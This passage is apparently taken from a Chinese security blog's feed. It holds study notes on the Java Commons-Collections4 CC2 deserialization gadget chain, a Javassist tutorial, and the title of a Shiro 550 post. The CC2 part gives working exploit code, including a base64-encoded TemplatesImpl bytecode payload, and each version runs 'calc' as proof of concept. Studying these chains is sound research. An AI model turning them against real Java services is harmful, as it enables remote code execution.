class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br><br>        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = object.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(object, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117013504158.png" alt="image-20211117013504158"></p><h2 id="改造升级PriorityQueue链"><a href="#改造升级PriorityQueue链" class="headerlink" title="改造升级PriorityQueue链"></a>改造升级PriorityQueue链</h2><p>这里准备按照管理尝试使用一下<code>TemplatesImpl</code>类加载字节码的方法执行命令,并且不使用数组的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplCC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvUnVuRXhlYzsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v&quot;</span> +<br>                <span class="hljs-string">&quot;aW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1s&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcA&quot;</span> +<br>                <span class="hljs-string">&quot;KgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29y&quot;</span> +<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYB&quot;</span> +<br>                <span class="hljs-string">&quot;AAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +<br>                <span class="hljs-string">&quot;SXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nl&quot;</span> +<br>                <span class="hljs-string">&quot;cmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcAKwEABjxpbml0PgEAAygpVgEAClNv&quot;</span> +<br>                <span class="hljs-string">&quot;dXJjZUZpbGUBAAxSdW5FeGVjLmphdmEBABNvcmcvbGNkbTEyMy9SdW5FeGVjDAAfACAHACwMAC0A&quot;</span> +<br>                <span class="hljs-string">&quot;LgEABGNhbGMMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9y&quot;</span> +<br>                <span class="hljs-string">&quot;dW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9s&quot;</span> +<br>                <span class="hljs-string">&quot;YW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEA&quot;</span> +<br>                <span class="hljs-string">&quot;JyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgA&quot;</span> +<br>                <span class="hljs-string">&quot;CQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAADgAMAAAAIAADAAAAAQANAA4AAAAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;DwAQAAEAAAABABEAEgACABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;BgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwAT&quot;</span> +<br>                <span class="hljs-string">&quot;AAAABAABABQACQAaABsAAgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFQAI&quot;</span> +<br>                <span class="hljs-string">&quot;ABYADAAAAAwAAQAAAAkAHAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4&quot;</span> +<br>                <span class="hljs-string">&quot;AAQSBbYABlexAAAAAgALAAAADgADAAAAFwAEABgADQAZAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Transformer fakeTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        Comparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeTransformer);<br>        PriorityQueue queque = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br>        queque.add(templates);<br>        queque.add(templates);<br><br>        setField(fakeTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queque);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz= obj.getClass();<br>        Field field= clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117021304932.png" alt="image-20211117021304932"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于<code>ProrityQueue</code>类的反序列化是不支持在 Commons-Collections3 中使用的，因为在 Commons-Collections4 之前这个类都没有实现反序列化接口。对于CC链的学习也告一段落了，接下来继续看看其他的东西，学无止境，充分利用好学习时间。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javassist</title>
    <link href="/2021/11/16/Javassist/"/>
    <url>/2021/11/16/Javassist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><blockquote><p>这个基本都是直接粘贴复制的，放在这里只是为了以后方便查看</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.21.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>对于 Javassist 的概念我看了一大堆但是都没有理解，这里直接动手运行一下就稍微理解了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException </span>&#123;<br>        <span class="hljs-comment">// 获取javassist维护的类池</span><br>        ClassPool pool = ClassPool.getDefault();<br>        <span class="hljs-comment">// 创建一个空类</span><br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;org.lcdm123.People&quot;</span>);<br>        <span class="hljs-comment">// 给类添加一个字段</span><br>        CtField namefield = <span class="hljs-keyword">new</span> CtField(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">// 为 name 字段设置权限</span><br>        namefield.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">// 初始化 name 字段</span><br>        ctClass.addField(namefield, CtField.Initializer.constant(<span class="hljs-string">&quot;lcdm123&quot;</span>));<br>        <span class="hljs-comment">// 生成 set get 方法</span><br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, namefield));<br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, namefield));<br>        <span class="hljs-comment">// 添加无参构造函数</span><br>        CtConstructor ctConstructor = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name=\&quot;lcdm123\&quot;;&#125;&quot;</span>);<br>        ctClass.addConstructor(ctConstructor);<br>        <span class="hljs-comment">// 创建一个方法</span><br>        CtMethod printNamefield = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        printNamefield.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">// $0 表示 this，$1 表示传入的第一个参数</span><br>        printNamefield.setBody(<span class="hljs-string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);<br>        ctClass.addMethod(printNamefield);<br>        <span class="hljs-comment">// 写入 class 文件</span><br>        ctClass.writeFile();<br>        <span class="hljs-comment">// 释放内存</span><br>        ctClass.detach();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接运行就会生成<code>People.class</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211113221914703.png" alt="image-20211113221914703"></p><p>直接利用 javassist 构造了一个class文件，这样就可以不用重新写一个类来构建生成class 文件了</p><h2 id="重要的方法"><a href="#重要的方法" class="headerlink" title="重要的方法"></a>重要的方法</h2><p>ClassPool重点有以下几个方法：</p><p>getDefault() 单例获取ClassPool<br>appendClassPath() 将目录添加到ClassPath<br>insertClassPath() 在ClassPath插入jar<br>get() 根据名称获取CtClass对象<br>toClass() 将CtClass转为Class 一旦被转换则不能修改<br>makeClass() 创建新的类或接口<br>更多移步官方文档：<a href="http://www.javassist.org/html/javassist/ClassPool.html">http://www.javassist.org/html/javassist/ClassPool.html</a></p><p>CtClass需要关注的方法：</p><p>addConstructor() 添加构造函数<br>addField() 添加字段<br>addInterface() 添加接口<br>addMethod() 添加方法<br>freeze() 冻结类使其不能被修改<br>defrost() 解冻使其能被修改<br>detach() 从ClassPool中删除类<br>toBytecode() 转字节码<br>toClass() 转Class对象<br>writeFile() 写入.class文件<br>setModifiers() 设置修饰符<br>移步：<a href="http://www.javassist.org/html/javassist/CtClass.html">http://www.javassist.org/html/javassist/CtClass.html</a></p><p>CtMethod继承CtBehavior，需要关注的方法：</p><p>insertBefore 在方法的起始位置插入代码<br>insterAfter 在方法的所有 return 语句前插入代码<br>insertAt 在指定的位置插入代码<br>setBody 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除<br>make 创建一个新的方法<br>更多移步：<a href="http://www.javassist.org/html/javassist/CtBehavior.html">http://www.javassist.org/html/javassist/CtBehavior.html</a></p><h2 id="使用-CtClass-生成对象"><a href="#使用-CtClass-生成对象" class="headerlink" title="使用 CtClass 生成对象"></a>使用 CtClass 生成对象</h2><p>上面生成的 ctClass 对象对应的是 Person.class，我们有三种方法调用 Person 类</p><h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Object o = ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>Method setName = o.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;setName&quot;</span>, String.<span class="hljs-params">class</span>)</span>;<br>setName.invoke(o,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>Method printName1 = o.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;printName&quot;</span>)</span>;<br>printName1.invoke(o);<br></code></pre></td></tr></table></figure><h3 id="加载-Class-文件"><a href="#加载-Class-文件" class="headerlink" title="加载 Class 文件"></a>加载 Class 文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool pool = ClassPool.getDefault();<br>pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123&quot;</span>);<br>CtClass PersonClass = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br>Object o = PersonClass.toClass().newInstance();<br></code></pre></td></tr></table></figure><h3 id="通过接口调用"><a href="#通过接口调用" class="headerlink" title="通过接口调用"></a>通过接口调用</h3><p>新建一个接口将Person类的方法都抽象出来</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">package org.lcdm123;<br><br>public<span class="hljs-built_in"> interface </span>IPerson &#123;<br>    String getName();<br><br>    void setName(String name);<br><br>    void printName();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ClassPool pool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;<br>pool.append<span class="hljs-constructor">ClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123\\Person.class&quot;</span>)</span>;<br>CtClass IPerson = pool.get(<span class="hljs-string">&quot;org.lcdm123.IPerson&quot;</span>);<br>CtClass Person = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span>defrost<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span>set<span class="hljs-constructor">Interfaces(<span class="hljs-params">new</span> CtClass[]&#123;IPerson&#125;)</span>;<br><br>IPerson o = (IPerson) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>o.set<span class="hljs-constructor">Name(<span class="hljs-string">&quot;lcdm&quot;</span>)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(o.get<span class="hljs-constructor">Name()</span>);<br>o.print<span class="hljs-constructor">Name()</span>;<br></code></pre></td></tr></table></figure><p>将Person类实现IPerson接口，然后创建实例时直接强转类型，就可以直接调用了。</p><h2 id="修改现有类"><a href="#修改现有类" class="headerlink" title="修改现有类"></a>修改现有类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123\\Person.class&quot;</span>);<br>CtClass Person = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br>Person.defrost();<br><br>CtMethod printName1 = Person.getDeclaredMethod(<span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">null</span>);<br>printName1.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName start ------\&quot;);&quot;</span>);<br>printName1.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName  over ------\&quot;);&quot;</span>);<br><br>Object o = Person.toClass().newInstance();<br>Method printName2 = o.getClass().getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>printName2.invoke(o, <span class="hljs-keyword">null</span>);<br></code></pre></td></tr></table></figure><p>参考文章</p><p><a href="https://y4er.com/post/javassist-learn/">https://y4er.com/post/javassist-learn/</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>Web</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro 550 反序列化(一)</title>
    <link href="/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/"/>
    <url>/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/</url>
    
